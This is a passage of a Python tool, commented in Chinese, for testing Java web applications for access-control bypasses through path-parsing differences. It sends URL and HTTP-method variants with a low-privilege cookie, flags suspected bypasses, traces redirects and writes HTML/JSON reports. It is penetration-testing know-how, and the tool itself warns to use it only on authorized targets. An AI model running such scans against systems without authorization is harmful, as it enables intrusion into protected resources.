    print("[*] 建立基线...")
    base_low, _, _, base_rtts = await get_baseline_adaptive(target, manager, "low", "低权限基线  ")
    base_high = None
    if args.high_cookie:
        base_high, _, _, _ = await get_baseline_adaptive(target, manager, "high", "高权限基线  ")

    # 错误页基线
    prefix = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    base_err, err_reason = await get_error_baseline(prefix, manager)
    if base_err:
        print(f"    错误页基线  : HTTP {base_err['code']}, 长度 {base_err['length']}（用于排除伪 2xx）")
    else:
        print(f"    错误页基线  : 未建立({err_reason})，错误页过滤降级")

    if base_low["code"] in OK_CODES:
        print("    ⚠ 低权限基线本身就是 2xx：该 URL 可能未受保护，所有变形将跳过判定")

    # v3.2 [需求8] 框架指纹识别（环境指纹后再决定变形策略，避免盲目全量打增加噪声）
    fps = fingerprint_framework(base_low, base_high, base_err)
    if fps:
        print("    框架指纹    :")
        for f in fps:
            print(f"      - {f['名称']} (证据: {f['证据']}) -> 推荐: {', '.join(f['推荐类别'])}")
    else:
        print("    框架指纹    : 未识别出明显特征（--smart 将回退全类别）")

    # 生成变形
    categories = args.categories if hasattr(args, "categories") and args.categories else None
    if getattr(args, "smart", False) and not categories:
        recs = recommended_categories(fps)
        if recs:
            categories = ",".join(recs)
            print(f"[*] 智能模式：按框架指纹启用 {len(recs)} 个推荐类别（--categories 显式指定时不生效）")
    exclude = getattr(args, "exclude_variants", None)
    variants = generate_variants(target, categories, exclude)
    total_generated = len(variants)
    if args.max_variants and len(variants) > args.max_variants:
        variants = variants[:args.max_variants]
        print(f"[!] --max-variants 生效：仅测试前 {len(variants)}/{total_generated} 个变形")

    print(f"\n[*] 共生成 {len(variants)} 个变形（已去重），开始测试 "
          f"(并发 {args.threads}, 间隔 {args.delay}s, 抖动 {args.jitter})...\n")
    print(pad("#", 8) + pad("类别", 12) + pad("方法", 8) + pad("状态", 7) + pad("长度", 9)
          + pad("判定", 18) + "说明 / 备注")
    print("-" * 106)

    # 异步并发执行
    semaphore = asyncio.Semaphore(max(1, args.threads))
    breaker = {"active": False, "streak": 0}

    async def work(v):
        if breaker["active"]:
            return {"variant": v,
                    "resp": {"code": -1, "length": 0, "body": "", "truncated": False,
                             "location": "", "ctype": "", "server": "", "cache_status": "",
                             "age": "", "headers": {}, "rtt": 0, "error": "aborted"},
                    "verdict": "", "note": "已熔断跳过", "confidence": "-"}

        async with semaphore:
            resp = await manager.send(v["url"], v["method"], v["headers"], kind="low", body=v.get("body"))

        if resp["error"]:
            breaker["streak"] += 1
            if args.abort_after and breaker["streak"] >= args.abort_after:
                breaker["active"] = True
        else:
            breaker["streak"] = 0

        verdict, note, conf = evaluate(resp, v["method"], base_low, base_high, base_err,
                                       args.threshold, base_rtts)
        return {"variant": v, "resp": resp, "verdict": verdict, "note": note, "confidence": conf}

    rows = []
    total = len(variants)
    done = 0
    num_w = len(str(total)) * 2 + 3  # 进度列宽
    tasks = [asyncio.create_task(work(v)) for v in variants]
    for coro in asyncio.as_completed(tasks):
        row = await coro
        rows.append(row)
        done += 1
        r, v = row["resp"], row["variant"]
        if r["error"] == "aborted":
            continue
        status = str(r["code"]) if not r["error"] else "ERR"
        verdict = row["verdict"] or "-"
        if row["verdict"] == "★疑似绕过":
            verdict = f"★疑似绕过[{row['confidence']}]"
        # v3.1: 进度计数前缀 [当前/总数]
        line = (pad(f"[{done}/{total}]", num_w) + pad(v["cat"], 12) + pad(v["method"], 8)
                + pad(status, 7) + pad(str(r["length"]), 9) + pad(verdict, 18) + v["desc"])
        if row["note"] and row["verdict"]:
            line += f"  ({row['note']})"
        print(line)

    if breaker["active"]:
        print(f"\n[!] 连续 {args.abort_after} 次请求失败，已熔断剩余变形（可能触发 WAF/目标不可达）")

    # v3.2 [需求5] HTTP 方法矩阵——同一路径不同方法对比，方法级鉴权不一致疑点
    matrix = method_matrix_summary(rows)
    if matrix:
        print(f"\n[*] HTTP 方法矩阵：{len(matrix)} 个方法样本（同一路径）")
        for m in matrix:
            flag = " ⚠2xx" if m["状态码"] in OK_CODES else ""
            print(f"    {pad(m['方法'], 34)} HTTP {m['状态码']}{flag}  {m['判定']}")
        n2xx = sum(1 for m in matrix if m["状态码"] in OK_CODES)
        if n2xx:
            print(f"    ⚠ {n2xx} 个方法变形在 GET 基线被拒时返回 2xx——方法级鉴权不一致疑点")

    # v3.2 [需求6] 重定向差异分析——多级跳转追踪 + 落点对比 + Location/正文联合判断
    redirect_rows = []
    if getattr(args, "max_redirect_trace", 8) and rows:
        candidates = [r for r in rows
                      if r["resp"].get("code") in REDIRECT_CODES and r["resp"].get("location")
                      and r["resp"]["error"] != "aborted"]
        marked = [r for r in candidates if r["variant"].get("follow")]
        others = [r for r in candidates if not r["variant"].get("follow")]
        selected = (marked + [r for r in others if r["verdict"] == "△需复核"]
                    + [r for r in others if r["verdict"] != "△需复核"])[:args.max_redirect_trace]
        if selected:
            print(f"\n[*] 重定向差异分析：追踪 {len(selected)} 条跳转链（每链最多 5 跳，含循环检测）...")
            base_chain = await trace_redirect_chain(manager, target, "GET")
            for row in selected:
                v = row["variant"]
                chain = await trace_redirect_chain(manager, v["url"], v["method"],
                                                   v["headers"], body=v.get("body"))
                analyze_redirect_row(row, chain, base_chain, base_low, base_high, args.threshold)
                redirect_rows.append(row)
                fin = row["redirect_final"]
                print(f"    [{v['cat']}] {v['desc']}"
                      f" -> {len(chain)}跳, 落点 HTTP {fin['状态码']} {fin['落点路径']}"
                      f"  判定: {row['verdict'] or '-'}")

    hits = [r for r in rows if r["verdict"] == "★疑似绕过"]
    reviews = [r for r in rows if r["verdict"] == "△需复核"]
    errors = [r for r in rows if r["verdict"] == "✕请求失败"]
    aborted = sum(1 for r in rows if r["resp"]["error"] == "aborted")

    # ---- 二次复核 ----
    if hits and not args.skip_recheck:
        print(f"\n[*] 对 {len(hits)} 个 ★ 命中项做二次复核（匿名 + 低权限连测 2 次）...")
        for row in hits:
            row["verify"], row["confidence"] = await second_verify(row, base_high, manager)
            print(f"    [{row['variant']['cat']}] {row['variant']['url']}\n"
                  f"        -> [{row['confidence']}] {row['verify']}")

    # ---- 命中聚类 ----
    clusters = cluster_hits(hits) if hits else []
    if clusters and len(clusters) < len(hits):
        print(f"\n[*] 命中归因：{len(hits)} 个命中项聚类为 {len(clusters)} 个根因")
        for cl in clusters:
            if cl["count"] > 1:
                print(f"    根因 [{cl['representative']['variant']['cat']}] "
                      f"{cl['representative']['variant']['desc']} "
                      f"(同根因 {cl['count']} 个变形)")

    print("-" * 106)
    stat = (f"[*] 完成：{len(variants)} 个变形 | ★疑似 {len(hits)} | △需复核 {len(reviews)}"
            f" | 请求失败 {len(errors)}")
    if aborted:
        stat += f" | 熔断跳过 {aborted}"
    print(stat)

    extra = {
        "fingerprint": fps,
        "method_matrix": matrix,
        "redirect_analysis": [{"手法": r["variant"]["desc"], "类别": r["variant"]["cat"],
                               "链": r["redirect_chain"], "落点": r["redirect_final"],
                               "判定": r["verdict"], "备注": r["note"]} for r in redirect_rows],
    }
    write_reports(report_prefix, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra)
    return len(hits), len(reviews)


# ---------------------------------------------------------------------------
# 11. 报告输出（JSON / CSV / TXT / HTML + 证据 + 聚类）
# ---------------------------------------------------------------------------
def slim(row):
    """报告行：不落地完整响应体，只保留元数据 + 短哈希对证"""
    v, r = row["variant"], row["resp"]
    return {
        "类别": v["cat"], "手法": v["desc"], "方法": v["method"], "URL": v["url"],
        "附加头": v["headers"], "请求体": v.get("body"),
        "状态码": r["code"], "长度": r["length"],
        "截断": ("是" if r.get("truncated") else ""),
        "Location": r["location"], "Content-Type": r["ctype"],
        "Server": r.get("server", ""), "缓存状态": r.get("cache_status", ""),
        "RTT秒": r["rtt"], "错误": r["error"],
        "判定": row["verdict"] or "-",
        "置信度": row.get("confidence", "-"),
        "响应SHA256": sha16(r["body"]),
        "备注": row["note"],
        # v3.2: 重定向链分析结果
        **({"重定向落点": row["redirect_final"]} if row.get("redirect_final") else {}),
        **({"重定向链": " -> ".join(str(h["码"]) for h in row["redirect_chain"])}
           if row.get("redirect_chain") else {}),
        **({"复核结论": row["verify"]} if row.get("verify") else {}),
        **({"证据文件": row["evidence"]} if row.get("evidence") else {}),
        **({"同根因变形": row.get("same_root")} if row.get("same_root") else {}),
    }


def save_evidence(dir_path, hits):
    """★ 命中项证据留存——请求信息 + 响应前 2000 字符 + SHA256"""
    os.makedirs(dir_path, exist_ok=True)
    for i, row in enumerate(hits, 1):
        v, r = row["variant"], row["resp"]
        fp = os.path.join(dir_path, f"hit_{i:02d}.txt")
        with open(fp, "w", encoding="utf-8", errors="replace") as f:
            f.write(f"URL: {v['url']}\n方法: {v['method']}\n附加头: {json.dumps(v['headers'], ensure_ascii=False)}\n")
            if v.get("body"):
                f.write(f"请求体: {v['body']}\n")
            f.write(f"状态码: {r['code']}\nContent-Type: {r['ctype']}\nLocation: {r['location'] or '-'}\n")
            f.write(f"Server: {r.get('server', '-')}\n缓存状态: {r.get('cache_status', '-')}\n")
            f.write(f"截断: {'是' if r.get('truncated') else '否'}\n")
            f.write(f"响应SHA256: {sha16(r['body'])}\n复核: {row.get('verify', '-')}\n")
            f.write("--- 响应体(前2000字符) ---\n")
            f.write((r["body"] or "")[:2000] + "\n")
        row["evidence"] = fp


def write_reports(prefix, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra=None):
    extra = extra or {}
    ts = time.strftime("%Y%m%d_%H%M%S")
    host = urlparse(target).netloc.replace(":", "_").replace(".", "_")
    base_name = f"{prefix}_{host}_{ts}"

    if hits and not args.no_evidence:
        save_evidence(base_name + "_evidence", hits)

    meta = {
        "目标": target, "时间": ts, "工具版本": VERSION,
        "低权限Cookie(脱敏)": mask_cookie(args.low_cookie),
        "低权限基线": {"状态码": base_low["code"], "长度": base_low["length"], "Location": base_low["location"]},
        "高权限基线": ({"状态码": base_high["code"], "长度": base_high["length"]} if base_high else None),
        "错误页基线": ({"状态码": base_err["code"], "长度": base_err["length"]} if base_err else None),
        "框架指纹": extra.get("fingerprint") or [],
        "HTTP方法矩阵": extra.get("method_matrix") or [],
        "重定向链分析": extra.get("redirect_analysis") or [],
        "统计": {
            "变形总数": len(rows), "疑似绕过": len(hits),
            "需复核": len(reviews),
            "请求失败": sum(1 for r in rows if r["verdict"] == "✕请求失败"),
            "熔断跳过": sum(1 for r in rows if r["resp"]["error"] == "aborted"),
            "聚类根因数": len(clusters),
        },
    }

    interesting = [r for r in rows if r["verdict"]]
    with open(base_name + ".json", "w", encoding="utf-8") as f:
        json.dump({**meta, "命中与复核项": [slim(r) for r in interesting],
                   "聚类归因": [{"根因": cl["representative"]["variant"]["desc"],
                                "同根因数": cl["count"],
                                "同根因变形": cl["same_root"]} for cl in clusters if cl["count"] > 1]},
                  f, ensure_ascii=False, indent=2)

    with open(base_name + ".csv", "w", encoding="utf-8-sig", newline="") as f:
        cols = ["类别", "手法", "方法", "URL", "状态码", "长度", "截断", "Location", "RTT秒",
                "Server", "缓存状态", "判定", "置信度", "响应SHA256", "重定向落点", "重定向链",
                "备注", "复核结论", "同根因变形", "证据文件"]
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
        w.writeheader()
        for r in interesting:
            w.writerow(slim(r))

    with open(base_name + ".txt", "w", encoding="utf-8") as f:
        f.write(f"目标: {target}\n时间: {ts}\n")
        f.write(f"低权限基线: HTTP {base_low['code']} (len={base_low['length']}, Location={base_low['location'] or '-'})\n")
        if base_high:
            f.write(f"高权限基线: HTTP {base_high['code']} (len={base_high['length']})\n")
        if base_err:
            f.write(f"错误页基线: HTTP {base_err['code']} (len={base_err['length']})\n")
        f.write(f"低权限Cookie(脱敏): {mask_cookie(args.low_cookie) or '(无)'}\n\n")
        if extra.get("fingerprint"):
            f.write("框架指纹: " + "; ".join(f"{fw['名称']}({fw['证据']})" for fw in extra["fingerprint"]) + "\n")
            recs = recommended_categories(extra["fingerprint"])
            if recs:
                f.write("推荐类别: " + ", ".join(recs) + "\n")
        f.write(f"\n=== ★ 疑似绕过 ({len(hits)}) ===\n")
        for r in hits:
            s = slim(r)
            f.write(f"[{s['类别']}] {s['方法']} HTTP {s['状态码']} len={s['长度']} "
                    f"置信度={s['置信度']} sha256={s['响应SHA256']} | {s['手法']}\n"
                    f"    {s['URL']}\n    备注: {s['备注']}"
                    + (f"\n    复核: {s['复核结论']}" if s.get("复核结论") else "")
                    + (f"\n    证据: {s['证据文件']}" if s.get("证据文件") else "")
                    + "\n")
        f.write(f"\n=== △ 需人工复核 ({len(reviews)}) ===\n")
        for r in reviews:
            s = slim(r)
            f.write(f"[{s['类别']}] {s['方法']} HTTP {s['状态码']} len={s['长度']} | {s['手法']} | {s['备注']}\n    {s['URL']}\n")

        # v3.2: 方法级鉴权疑点
        if extra.get("method_matrix"):
            m2xx = [m for m in extra["method_matrix"] if m["状态码"] in OK_CODES]
            if m2xx:
                f.write(f"\n=== 方法级鉴权疑点: {len(m2xx)} 个方法变形返回 2xx ===\n")
                for m in m2xx:
                    f.write(f"    {m['方法']} -> HTTP {m['状态码']} {m['判定']} {m['备注']}\n")

        # v3.2: 重定向链分析
        if extra.get("redirect_analysis"):
            f.write(f"\n=== 重定向链分析 ({len(extra['redirect_analysis'])}) ===\n")
            for a in extra["redirect_analysis"]:
                f.write(f"[{a['类别']}] {a['手法']} | {len(a['链'])}跳"
                        f" 落点HTTP {a['落点']['状态码']} {a['落点']['落点路径']} | {a['判定'] or '-'}\n")

    generate_html_report(base_name, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra)

    print(f"[*] 报告已保存: {base_name}.txt / .json / .csv / .html"
          + (f" | 证据目录: {base_name}_evidence/" if hits and not args.no_evidence else ""))


# ---------------------------------------------------------------------------
# 12. HTML 可视化报告（含 diff 视图 + 覆盖率 + 聚类）
# ---------------------------------------------------------------------------
def generate_html_report(base_name, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra=None):
    """生成自包含 HTML 报告——摘要卡片 + 命中表 + diff 视图 + 覆盖率图
    v3.2: 新增框架指纹 / HTTP 方法矩阵 / 重定向链分析三个板块"""
    extra = extra or {}
    ts = time.strftime("%Y-%m-%d %H:%M:%S")

    # 覆盖率统计
    cat_counts = {}
    cat_hits = {}
    for row in rows:
        cat = row["variant"]["cat"]
        cat_counts[cat] = cat_counts.get(cat, 0) + 1
        if row["verdict"] == "★疑似绕过":
            cat_hits[cat] = cat_hits.get(cat, 0) + 1

    # 置信度分布
    conf_dist = {"高": 0, "中": 0, "低": 0}
    for h in hits:
        conf = h.get("confidence", "中")
        conf_dist[conf] = conf_dist.get(conf, 0) + 1

    # 生成 diff 视图（最多 5 个命中项；v3.1：单边限 MAX_DIFF_CHARS 防止大卡）
    diff_sections = []
    for i, hit in enumerate(hits[:5]):
        v = hit["variant"]
        r = hit["resp"]
        baseline_body = (base_low.get("body") or "")[:MAX_DIFF_CHARS]
        resp_body = (r["body"] or "")[:MAX_DIFF_CHARS]
        try:
            diff_html = difflib.HtmlDiff().make_table(
                baseline_body.splitlines(keepends=True),
                resp_body.splitlines(keepends=True),
                fromdesc="低权限基线", todesc="变形响应",
                context=True, numlines=5
            )
        except Exception:
            diff_html = "<p>(diff 生成失败)</p>"
        diff_sections.append(f"""
        <div class="diff-view">
            <h3>[{esc(v['cat'])}] {esc(v['desc'])}</h3>
            <p class="diff-meta">HTTP {r['code']} | len={r['length']} | 置信度={esc(hit.get('confidence', '-'))}</p>
            {diff_html}
        </div>""")

    # 命中表行（v3.1：URL 截断显示 + title 悬浮全文，可右键复制完整 URL）
    hit_rows_html = ""
    for h in hits:
        s = slim(h)
        conf_class = {"高": "badge-high", "中": "badge-mid", "低": "badge-low"}.get(s["置信度"], "badge-low")
        same_root = ""
        if s.get("同根因变形"):
            same_root = f"<br><small class='muted'>同根因: {esc(', '.join(s['同根因变形'][:3]))}</small>"
        url_disp = esc(s["URL"][:80]) + ("…" if len(s["URL"]) > 80 else "")
        trunc_mark = " <span class='badge badge-low'>截断</span>" if s.get("截断") else ""
        hit_rows_html += f"""
            <tr>
                <td>{esc(s['类别'])}</td>
                <td>{esc(s['手法'])}</td>
                <td>{esc(s['方法'])}</td>
                <td>{s['状态码']}</td>
                <td>{s['长度']}{trunc_mark}</td>
                <td><span class="badge {conf_class}">{esc(s['置信度'])}</span></td>
                <td>{esc(s['备注'])}{same_root}</td>
                <td><small class="muted" title="{esc(s['URL'])}">{url_disp}</small></td>
            </tr>"""

    # 覆盖率柱状图
    max_count = max(cat_counts.values()) if cat_counts else 1
    coverage_bars = ""
    for cat in sorted(cat_counts.keys()):
        count = cat_counts[cat]
        hits_count = cat_hits.get(cat, 0)
        width = int(count / max_count * 100)
        hit_width = int(hits_count / max_count * 100) if hits_count else 0
        coverage_bars += f"""
            <div class="bar-row">
                <span class="bar-label">{esc(cat)}</span>
                <div class="bar-track">
                    <div class="bar bar-total" style="width: {width}%">{count}</div>
                    <div class="bar bar-hit" style="width: {hit_width}%">{hits_count if hits_count else ''}</div>
                </div>
            </div>"""

    # 聚类信息
    cluster_html = ""
    if clusters and len(clusters) < len(hits):
        cluster_html = "<div class='card'><h3>命中归因聚类</h3><table><tr><th>根因</th><th>同根因变形数</th><th>同根因变形</th></tr>"
        for cl in clusters:
            if cl["count"] > 1:
                cluster_html += f"<tr><td>{esc(cl['representative']['variant']['desc'])}</td><td>{cl['count']}</td><td><small>{esc(', '.join(cl['same_root'][:5]))}</small></td></tr>"
        cluster_html += "</table></div>"

    # v3.2: 框架指纹板块（智能模式依据）
    fp_html = ""
    if extra.get("fingerprint"):
        fp_rows = "".join(
            f"<tr><td>{esc(fw['名称'])}</td><td>{esc(fw['证据'])}</td>"
            f"<td>{esc(', '.join(fw['推荐类别']))}</td>"
            f"<td><small class='muted'>{esc(fw.get('说明', ''))}</small></td></tr>"
            for fw in extra["fingerprint"])
        fp_html = ("<div class='card'><h3>框架指纹与环境识别（智能模式依据）</h3>"
                   "<table><tr><th>组件</th><th>证据</th><th>推荐类别</th><th>差异说明</th></tr>"
                   + fp_rows + "</table></div>")

    # v3.2: HTTP 方法矩阵板块
    mm_html = ""
    matrix = extra.get("method_matrix") or []
    if matrix:
        mm_rows = "".join(
            f"<tr><td>{esc(m['方法'])}</td><td>{m['状态码']}</td>"
            f"<td>{esc(m['判定'])}</td><td><small class='muted'>{esc(m['备注'] or '')}</small></td></tr>"
            for m in matrix)
        n2xx = sum(1 for m in matrix if m["状态码"] in OK_CODES)
        warn = (f"<p class='meta-line' style='color:#e8463a;'>"
                f"⚠ {n2xx} 个方法变形在 GET 基线被拒时返回 2xx——方法级鉴权不一致疑点</p>") if n2xx else ""
        mm_html = (f"<h2>HTTP 方法矩阵（方法级鉴权一致性）</h2>{warn}"
                   "<table><tr><th>方法/变形</th><th>状态码</th><th>判定</th><th>备注</th></tr>"
                   + mm_rows + "</table>")

    # v3.2: 重定向链分析板块
    rd_html = ""
    for a in extra.get("redirect_analysis") or []:
        hops_disp = "<br>".join(
            f"{esc(str(h['码']))} → {esc((h['Location'] or h['URL'])[:90])}"
            for h in a["链"])
        rd_html += (f"<tr><td>{esc(a['类别'])}<br><small class='muted'>{esc(a['手法'])}</small></td>"
                    f"<td><small>{hops_disp}</small></td>"
                    f"<td>{a['落点']['状态码']}</td><td><small>{esc(a['落点']['落点路径'])}</small></td>"
                    f"<td>{esc(a['判定'] or '-')}</td><td><small>{esc(a['备注'] or '')}</small></td></tr>")
    if rd_html:
        rd_html = ("<h2>重定向链分析（多级跳转追踪 + 落点对比）</h2>"
                   "<table><tr><th>变形</th><th>跳转链</th><th>落点码</th><th>落点路径</th><th>判定</th><th>备注</th></tr>"
                   + rd_html + "</table>")

    html_content = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>权限绕过测试报告 - {esc(target)}</title>
<style>
body {{ font-family: -apple-system, "PingFang SC", "Noto Sans CJK SC", system-ui, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; color: #333; }}
.container {{ max-width: 1200px; margin: 0 auto; }}
h1 {{ color: #1a1a2e; border-bottom: 3px solid #4B3FE3; padding-bottom: 10px; font-size: 22px; }}
h2 {{ color: #1a1a2e; margin-top: 30px; font-size: 18px; }}
.summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin: 20px 0; }}
.card {{ background: #fff; border-radius: 8px; padding: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
.card h3 {{ margin: 0 0 8px 0; font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }}
.card .value {{ font-size: 24px; font-weight: 600; color: #1a1a2e; }}
.card.hit .value {{ color: #e8463a; }}
.card.review .value {{ color: #efaa17; }}
.card.cluster .value {{ color: #4B3FE3; }}
table {{ width: 100%; border-collapse: collapse; margin: 15px 0; background: #fff; border-radius: 8px; overflow: hidden; }}
th, td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid #eee; font-size: 13px; }}
th {{ background: #f8f8f8; font-weight: 600; color: #555; }}
tr:hover {{ background: #f5f5ff; }}
.diff-view {{ margin: 20px 0; background: #fff; border-radius: 8px; padding: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
.diff-view h3 {{ color: #4B3FE3; margin: 0 0 5px 0; font-size: 15px; }}
.diff-meta {{ color: #888; font-size: 12px; margin: 0 0 10px 0; }}
.diff-view table {{ font-size: 12px; font-family: monospace; }}
.diff_view table td {{ white-space: pre-wrap; word-break: break-all; }}
.bar-chart {{ margin: 15px 0; }}
.bar-row {{ display: flex; align-items: center; margin: 4px 0; }}
.bar-label {{ width: 100px; font-size: 12px; color: #666; flex-shrink: 0; }}
.bar-track {{ flex: 1; height: 22px; background: #eee; border-radius: 4px; position: relative; overflow: hidden; }}
.bar {{ height: 100%; border-radius: 4px; display: flex; align-items: center; padding-left: 8px; color: #fff; font-size: 11px; position: absolute; left: 0; top: 0; }}
.bar-total {{ background: #4B3FE3; z-index: 1; }}
.bar-hit {{ background: #e8463a; z-index: 2; opacity: 0.85; }}
.badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }}
.badge-high {{ background: #fee; color: #c00; }}
.badge-mid {{ background: #fff3e0; color: #e65100; }}
.badge-low {{ background: #e8f5e9; color: #2e7d32; }}
.muted {{ color: #999; }}
.meta-line {{ color: #666; font-size: 13px; margin: 3px 0; }}
</style>
</head>
<body>
<div class="container">
<h1>权限绕过测试报告 v{VERSION}</h1>
<p class="meta-line">目标: <strong>{esc(target)}</strong></p>
<p class="meta-line">时间: {ts} | 工具版本: v{VERSION}</p>
<p class="meta-line">低权限基线: HTTP {base_low['code']} (len={base_low['length']})
{f'| 高权限基线: HTTP {base_high["code"]} (len={base_high["length"]})' if base_high else ''}
{f'| 错误页基线: HTTP {base_err["code"]} (len={base_err["length"]})' if base_err else ''}</p>

<div class="summary">
    <div class="card"><h3>变形总数</h3><div class="value">{len(rows)}</div></div>
    <div class="card hit"><h3>★ 疑似绕过</h3><div class="value">{len(hits)}</div></div>
    <div class="card review"><h3>△ 需复核</h3><div class="value">{len(reviews)}</div></div>
    <div class="card cluster"><h3>聚类根因</h3><div class="value">{len(clusters)}</div></div>
</div>

<div class="summary">
    <div class="card"><h3>高置信度</h3><div class="value">{conf_dist['高']}</div></div>
    <div class="card"><h3>中置信度</h3><div class="value">{conf_dist['中']}</div></div>
    <div class="card"><h3>低置信度</h3><div class="value">{conf_dist['低']}</div></div>
</div>

{cluster_html}

{fp_html}

<h2>变形覆盖率（按类别）</h2>
<div class="bar-chart">
    <div class="bar-row"><span class="bar-label"></span><span style="font-size:11px;color:#4B3FE3;">■ 总数</span> &nbsp; <span style="font-size:11px;color:#e8463a;">■ 命中</span></div>
    {coverage_bars}
</div>

{mm_html}

{rd_html}

<h2>★ 疑似绕过详情</h2>
<table>
<tr><th>类别</th><th>手法</th><th>方法</th><th>状态码</th><th>长度</th><th>置信度</th><th>备注</th><th>URL</th></tr>
{hit_rows_html if hit_rows_html else '<tr><td colspan="8" style="text-align:center;color:#999;">无命中项</td></tr>'}
</table>

<h2>响应体差异对比（Diff 视图）</h2>
{''.join(diff_sections) if diff_sections else '<p style="color:#999;">无命中项，无可对比的 diff 视图。</p>'}

</div>
</body>
</html>"""

    with open(base_name + ".html", "w", encoding="utf-8") as f:
        f.write(html_content)


# ---------------------------------------------------------------------------
# 13. YAML 配置文件支持
# ---------------------------------------------------------------------------
def load_yaml_config(path):
    """加载 YAML 配置文件"""
    if yaml is None:
        print("[-] PyYAML 未安装，请执行: pip install pyyaml")
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}
    except OSError as e:
        print(f"[-] 读取配置文件失败: {e}")
        return {}


def merge_config(args, cfg):
    """合并 YAML 配置与 CLI 参数（CLI 优先级更高）。
    v3.1 修复：改用 None 哨兵判断"用户未显式传参"，用户显式传默认值也能覆盖 YAML。"""
    # 目标
    if not args.url and not args.file:
        targets = cfg.get("targets", [])
        if isinstance(targets, list):
            args.url = targets
        elif isinstance(targets, str):
            args.url = [targets]

    # Cookies
    if not args.low_cookie:
        args.low_cookie = cfg.get("cookies", {}).get("low", "")
    if not args.high_cookie:
        args.high_cookie = cfg.get("cookies", {}).get("high", "")

    # 自定义头
    if not args.header and cfg.get("headers"):
        args.header = [f"{k}: {v}" for k, v in cfg["headers"].items()]

    # 阈值（None = 用户未传）
    if args.threshold is None:
        args.threshold = cfg.get("thresholds", {}).get("content_similarity")

    # 限速
    rl = cfg.get("rate_limit", {})
    if args.delay is None:
        args.delay = rl.get("delay")
    if args.jitter is None:
        args.jitter = rl.get("jitter")
    if args.threads is None:
        args.threads = rl.get("threads")
    if args.abort_after is None:
        args.abort_after = rl.get("abort_after")

    # 变形筛选
    deform = cfg.get("deformations", {})
    if not args.categories:
        cats = deform.get("categories")
        if cats:
            args.categories = ",".join(cats) if isinstance(cats, list) else cats
    if not args.exclude:
        ex = deform.get("exclude", [])
        args.exclude_variants = list(ex) if ex else []
    if args.max_variants is None:
        args.max_variants = deform.get("max_variants")

    # 代理
    if not args.proxy:
        args.proxy = cfg.get("proxy", "")

    # v3.2: 智能模式 / 指纹模式 / 重定向追踪
    if not getattr(args, "smart", False):
        args.smart = bool(cfg.get("smart", False))
    if not getattr(args, "fingerprint_only", False):
        args.fingerprint_only = bool(cfg.get("fingerprint_only", False))
    if getattr(args, "max_redirect_trace", None) is None:
        args.max_redirect_trace = cfg.get("redirect", {}).get("max_trace")

    return args


def apply_defaults(args):
    """v3.1: YAML 合并后统一回填默认值（None 哨兵模式的配套步骤）"""
    if args.threshold is None:
        args.threshold = 0.90
    if args.delay is None:
        args.delay = 0.2
    if args.jitter is None:
        args.jitter = 0.3
    if args.threads is None:
        args.threads = 1
    if args.abort_after is None:
        args.abort_after = 8
    if getattr(args, "max_redirect_trace", None) is None:
        args.max_redirect_trace = 8
    return args


# ---------------------------------------------------------------------------
# 14. 参数解析与入口
# ---------------------------------------------------------------------------
def parse_headers(items):
    """--header 'Key: Value' 列表 -> dict"""
    h = {}
    for it in items or []:
        if ":" in it:
            k, v = it.split(":", 1)
            h[k.strip()] = v.strip()
        else:
            print(f"[!] 忽略无法解析的 header: {it!r}（应为 'Key: Value'）")
    return h


def read_cookie_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except OSError as e:
        print(f"[!] 读取 Cookie 文件失败 {path}: {e}")
        return ""


def parse_args():
    p = argparse.ArgumentParser(
        description="Java 权限绕过（路径解析差异）URL 变形测试器 v" + VERSION,
        epilog="退出码: 有 ★ 命中=1, 无命中=0。⚠️ 仅限对已获书面授权的目标使用！")
    p.add_argument("--url", action="append", help="目标 URL，可多次指定")
    p.add_argument("--file", help="批量目标文件，每行一个 URL")
    p.add_argument("--config", help="YAML 配置文件路径（CLI 参数优先级更高）")
    p.add_argument("--low-cookie", default="", help="低权限/未登录 Cookie")
    p.add_argument("--high-cookie", default="", help="高权限 Cookie（可选，精确对比用）")
    p.add_argument("--low-cookie-file", default="", help="从文件读取低权限 Cookie（避免 shell 历史泄漏）")
    p.add_argument("--high-cookie-file", default="", help="从文件读取高权限 Cookie")
    p.add_argument("--header", action="append", help="自定义请求头 'Key: Value'，可多次指定")
    p.add_argument("--delay", type=float, default=None, help="全局请求间隔秒数（默认 0.2）")
    p.add_argument("--jitter", type=float, default=None, help="间隔随机抖动比例 0~1（默认 0.3，0 关闭）")
    p.add_argument("--threads", type=int, default=None, help="并发数（默认 1，建议 <=10）")
    p.add_argument("--proxy", default="", help="HTTP 代理，如 http://127.0.0.1:8080")
    p.add_argument("--timeout", type=int, default=10, help="单请求超时秒数（默认 10）")
    p.add_argument("--threshold", type=float, default=None, help="与基线的内容相似度阈值（默认 0.90）")
    p.add_argument("--abort-after", type=int, default=None, help="连续 N 次请求失败后熔断（默认 8，0 关闭）")
    p.add_argument("--out", default="bypass_report", help="报告文件名前缀（默认 bypass_report）")
    # v3.1 [D3 修复] --verify → --tls-verify；--no-verify → --skip-recheck（旧名兼容）
    p.add_argument("--tls-verify", dest="tls_verify", action="store_true",
                   help="开启 TLS 证书校验（默认关闭）")
    p.add_argument("--verify", dest="tls_verify", action="store_true",
                   help=argparse.SUPPRESS)  # 旧别名，兼容用
    p.add_argument("--skip-recheck", dest="skip_recheck", action="store_true",
                   help="跳过 ★ 命中项的二次复核")
    p.add_argument("--no-verify", dest="skip_recheck", action="store_true",
                   help=argparse.SUPPRESS)  # 旧别名，兼容用
    p.add_argument("--no-evidence", action="store_true", help="不保存 ★ 命中项的响应证据")
    p.add_argument("--categories", default=None,
